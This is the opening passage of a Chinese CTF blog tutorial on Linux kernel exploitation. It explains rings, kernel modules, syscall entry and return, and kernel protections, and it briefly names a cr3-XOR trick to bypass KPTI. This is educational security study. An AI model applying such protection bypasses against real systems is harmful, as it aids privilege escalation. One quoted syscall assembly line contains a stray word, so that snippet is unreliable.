	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-xs">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    LINKS
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    看雪
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
                                                    吾爱破解
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-Links"
                        >
                            <span>
                                LINKS
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/essays"
                        >
                            <span>Essays</span>
                            <i class="fa-regular fa-comment fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">40</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">138</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">深入理解Pwn_Kernel及相关例题</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-10-16 20:15:29</span>
        <span class="mobile">2023-10-16 20:15:29</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-06-04 16:57:03</span>
            <span class="mobile">2025-06-04 16:57:03</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/CTF/">CTF</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Pwn-Kernel/">Pwn_Kernel</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/Linux_kernel_exploit" >附件地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>最近重新跟着老师学了一遍Linux内核安全，所以从博客里翻出来这个古老的文章做一些翻新和添油加醋，但内容依然有很多不足，文章结构也比较混乱，后续会进行改进。这里做的是 Linux Kernel pwn 一些利用手法的记录，后面如果学到 Windows kernel pwn会另开一个篇章。篇幅有限，后面一些内容再做补充。本文内容适合入门学习。还有一些内容有时间再写……</p>
<p><a href="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/">深入理解Pwn_heap及相关赛题</a></p>
<p><a href="https://jelasin.github.io/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/">深入理解Pwn_IO_FILE及相关赛题</a></p>
<p>主要参考:</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/readme/" >ctf-wiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>推荐一个适合学习<code>linux kernel</code>开源项目<a class="link"   target="_blank" rel="noopener" href="https://github.com/0voice/linux_kernel_wiki#1" >linux_kernel_wiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。这部分的基础知识是很简单的介绍，后门会对内核相关的基础知识新开篇章进行略详细的学习。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.kernelconfig.io/index.html" >kernel config search<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="内核简介"><a href="#内核简介" class="headerlink" title="内核简介"></a>内核简介</h2><p>通常来说我们可以把内核架构分为两种：宏内核和微内核，此外还有混合内核，外内核。<code>kernel</code> 也是一个程序，用来管理软件发出的数据 <code>I/O</code> 要求，将这些要求转义为指令，交给 <code>CPU</code> 和计算机中的其他组件处理，<code>kernel</code> 是现代操作系统最基本的部分。</p>
<p><code>kernel</code> 最主要的功能有两点：</p>
<ul>
<li>控制并与硬件进行交互</li>
<li>提供 <code>application</code> 能运行的环境</li>
</ul>
<p>包括 <code>I/O</code>，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。需要注意的是，<code>kernel</code> 的 <code>crash</code> 通常会引起重启。<code>linux</code>内核采用的是单内核结构，效率高，但是体积大。<code>Linux</code> 内核包含系统调用接口，进程管理，内存管理，文件系统，网络管理，设备驱动。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/kernel_cap.jpg"
                      alt="kernel_cap"
                ></p>
<h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p><code>intel CPU</code> 将 <code>CPU</code> 的特权级别分为 4 个级别：<code>Ring0</code>, <code> Ring1</code>, <code>Ring2</code>, <code>Ring3</code>。大多数的现代操作系统只使用 <code>Ring0</code> 和 <code>Ring3</code>。</p>
<ul>
<li>内核空间运行在 <code>Ring0</code> 特权等级，拥有自己的空间，位于内存的高地址。</li>
<li>用户空间则是我们平时应用程序运行的空间，运行在 <code>Ring3</code> 特权等级，使用较低地址。</li>
<li><code>Ring0</code> 只给 <code>OS</code> 使用，<code>Ring3</code> 所有程序都可以使用，内层 <code>Ring</code> 可以随便使用外层 <code>Ring</code> 的资源。</li>
</ul>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/RingModel.png"
                      alt="RingModel"
                ></p>
<h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，LKMs 的文件格式和用户态的可执行程序(ELF)相同。包括:</p>
<ul>
<li>驱动程序（Device drivers）<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>…</li>
</ul>
</li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
<h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a><strong>相关指令</strong></h3><ul>
<li><code>insmod</code>: 讲指定模块加载到内核中</li>
<li><code>rmmod</code>: 从内核中卸载指定模块</li>
<li><code>lsmod</code>: 列出已经加载的模块</li>
<li><code>modprobe</code>: 添加或删除模块，<code>modprobe</code> 在加载模块时会查找依赖关系</li>
</ul>
<p>大多数<code>CTF</code>中的 <code>kernel vulnerability</code> 也出现在 <code>LKM</code> 中。</p>
<h3 id="用户态-内核态"><a href="#用户态-内核态" class="headerlink" title="用户态-&gt;内核态"></a><strong>用户态-&gt;内核态</strong></h3><p><strong>切换条件</strong></p>
<p>当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换。</p>
<ul>
<li>系统调用(软中断)：</li>
</ul>
<p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p>
<blockquote>
<p>64bit 系统调用编号<br><code>cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep __NR_</code><br>32bit 系统调用编号<br><code>cat /usr/include/asm/unistd_32.h | grep __NR_</code></p>
</blockquote>
<ul>
<li>外设中断(硬中断)：当外围设备完成用户的请求操作后，会像CPU发出中断信号，此时，CPU就会暂停执行下一条即将要执行的指令，转而去执行中断信号对应的处理程序，如果先前执行的指令是在用户态下，则自然就发生从用户态到内核态的转换。</li>
<li>异常：当CPU正在执行运行在用户态的程序时，突然发生某些预先不可知的异常事件，这个时候就会触发从当前用户态执行的进程转向内核态执行相关的异常事件，最典型的就是缺页异常。</li>
</ul>
<p><strong>具体过程：</strong></p>
<ol>
<li>通过 <code>swapgs</code> 切换 GS 段寄存器，在中断或异常处理的entry代码处, 会执行SWAPGS切换到kernel GS, GS.base 是存储了中断stack 的地址。将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。</li>
<li>通过 push 保存各寄存器值，具体的 <a class="link"   target="_blank" rel="noopener" href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S" >代码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下:</li>
</ol>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ENTRY</span>(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line">movq %rsp, <span class="built_in">PER_CPU_VAR</span>(rsp_scratch)</span><br><span class="line"><span class="function">movq <span class="title">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span></span><br><span class="line"><span class="function"><span class="comment">/* Construct struct pt_regs on stack */</span></span></span><br><span class="line"><span class="function">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span></span><br><span class="line"><span class="function">pushq  <span class="title">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span></span><br><span class="line"><span class="function">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span></span><br><span class="line"><span class="function">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span></span><br><span class="line"><span class="function">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span></span><br><span class="line"><span class="function">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span></span><br><span class="line"><span class="function">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span></span><br><span class="line"><span class="function">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span></span><br><span class="line"><span class="function">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span></span><br><span class="line"><span class="function">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span></span><br><span class="line"><span class="function">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span></span><br><span class="line"><span class="function">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span></span><br><span class="line"><span class="function">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span></span><br><span class="line"><span class="function">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span></span><br><span class="line"><span class="function">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span></span><br><span class="line"><span class="function">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span></span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li>通过汇编指令判断是否为 <code>x32_abi</code>。</li>
<li>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li>
</ol>
<blockquote>
<p>总结：</p>
<p>[1] 从当前进程的描述符中提取其内核栈的<code>ss0</code>及<code>esp0</code>信息。</p>
<p>[2] 使用<code>ss0</code>和<code>esp0</code>指向的内核栈将当前进程的<code>cs,eip,eflags,ss,esp</code>信息保存起来，这个过程也完成了由用户栈到内核栈的切换过程，同时保存了被暂停执行的程序的下一条指令。</p>
<p>[3] 将先前由中断向量检索得到的中断处理程序的<code>cs,eip</code>信息装入相应的寄存器，开始执行中断处理程序，这时就转到了内核态的程序执行了。</p>
</blockquote>
<h3 id="内核态-用户态"><a href="#内核态-用户态" class="headerlink" title="内核态-&gt;用户态"></a><strong>内核态-&gt;用户态</strong></h3><ul>
<li>通过 <code>swapgs</code> 恢复 <code>GS</code> 值</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code> （中断返回指令）恢复到用户空间继续执行。如果使用 <code>iretq</code> 还需要通过堆栈给出用户空间的一些信息(<code>CS, eflags/rflags, esp/rsp</code> 等)，即 <code>trap_frame</code> 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">trap_frame</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> user_rip;</span><br><span class="line">    <span class="type">size_t</span> user_cs;</span><br><span class="line">    <span class="type">size_t</span> user_rflags;</span><br><span class="line">    <span class="type">size_t</span> user_sp;</span><br><span class="line">    <span class="type">size_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></div>

<ul>
<li>对于开启了 <code>KPTI</code>（内核页表隔离），我们不能像之前那样直接 <code>swapgs; iret</code> 返回用户态，而是在返回用户态之前还需要将用户进程的页表给切换回来。</li>
</ul>
<h3 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a><strong>内核态函数</strong></h3><p>相比用户态库函数，内核态的函数有了一些变化：</p>
<ol>
<li><code>printf()</code>变更为<code>printk()</code>，但需要注意的是<code>printk()</code>不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果。</li>
<li><code>memcpy()</code>变更为<code>copy_from_user()/copy_to_user()</code>：<ul>
<li><code>copy_from_user()</code> 实现了将用户空间的数据传送到内核空间。</li>
<li><code>copy_to_user()</code> 实现了将内核空间的数据传送到用户空间。</li>
</ul>
</li>
<li><code>malloc()</code>变更为<code>kmalloc()</code>，内核态的内存分配函数，和<code>malloc()</code>相似，但使用的是 <code>slab/slub/slob</code> 分配器，多为<code>slub</code>。</li>
<li><code>free()</code>变更为<code>kfree()</code>，同 <code>kmalloc()</code>。</li>
</ol>
<h2 id="内核保护"><a href="#内核保护" class="headerlink" title="内核保护"></a>内核保护</h2><p>这里贴一个<a class="link"   target="_blank" rel="noopener" href="https://github.com/a13xp0p0v/linux-kernel-defence-map" >github项目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>和两个大佬文章，<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/238363" >一个<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://www.51cto.com/article/747639.html#:~:text=3%20Linux%E5%86%85%E6%A0%B8%E4%BF%9D%E6%8A%A4%E4%B8%8E%E7%BB%95%E8%BF%87%201%203.1%20KASLR%20%E4%BF%9D%E6%8A%A4%20linux%E5%86%85%E6%A0%B8%EF%BC%882005%E5%B9%B4%EF%BC%89%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81KASLR%E3%80%82%20KASLR%EF%BC%88Kernel,SMEP&SMAP%E4%BF%9D%E6%8A%A4%20linux%E5%86%85%E6%A0%B8%E4%BB%8E3.0%EF%BC%882011%E5%B9%B48%E6%9C%88%EF%BC%89%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81SMEP%EF%BC%8C3.7%EF%BC%882012%E5%B9%B412%E6%9C%88%EF%BC%89%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81SMAP%E3%80%82%20SMEP%EF%BC%88Supervisor%20Mode%20Execution%20Protection%EF%BC%89%E6%98%AF%E4%B8%80%E7%A7%8D%E7%94%A8%E4%BA%8E%E4%BF%9D%E6%8A%A4%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E3%80%82%20%E5%AE%83%E9%80%9A%E8%BF%87%E5%9C%A8CPU%E5%BC%80%E4%B8%80%E4%B8%AA%E6%AF%94%E7%89%B9%E4%BD%8D%EF%BC%8C%E6%9D%A5%E9%99%90%E5%88%B6%E5%86%85%E6%A0%B8%E6%80%81%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7%E6%80%81%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%20" >另一个<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。内核栈和内核堆的相关保护会在将栈和堆时介绍。</p>
<h3 id="空间相关"><a href="#空间相关" class="headerlink" title="空间相关"></a><strong>空间相关</strong></h3><ul>
<li><p>**<code>smep</code>**：</p>
<p><code>Supervisor Mode Execution Protection</code>(管理模式执行保护)，当处理器处于 <code>ring 0</code> 模式，执行用户空间的代码会触发页错误。（在 <code>arm</code> 中该保护称为 <code>PXN</code>)</p>
</li>
<li><p>**<code>smap</code>**：</p>
<p><code>Superivisor Mode Access Protection</code>(管理模式访问保护)，类似于 <code>smep</code>，当处理器处于 <code>ring 0</code> 模式，访问用户空间的数据会触发页错误。</p>
</li>
<li><p>**<code>KPTI</code>**：</p>
<p><code>kernel page-table isolation</code>，内核页表隔离，进程页表隔离。旨在更好地隔离用户空间与内核空间的内存来提高安全性。<code>KPTI</code>通过完全分离用户空间与内核空间页表来解决页表泄露。一旦开启了<code>KPTI</code>，由于内核态和用户态的页表不同，所以如果使用 <code>ret2user</code>或内核执行<code>ROP</code>返回用户态时，由于内核态无法确定用户态的页表，就会报出一个段错误。可以利用内核现有的gadget将 <code>cr3</code> 与 <code>0x1000</code> 异或(第13位置0)来完成从用户态PGD转换成内核态PGD。</p>
</li>
<li><p><strong><code>CONFIG_CFI_CLANG</code>&#x3D;y</strong>:</p>
<p><code>Control Flow Integrity</code>，即控制流完整性，传统<code>ROP</code>基本宣告死亡。</p>
</li>
<li><p><strong>Hardened Usercopy</strong></p>
<p>hardened usercopy 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，<strong>主要检查拷贝过程中对内核空间中数据的读写是否会越界</strong>：</p>
<ul>
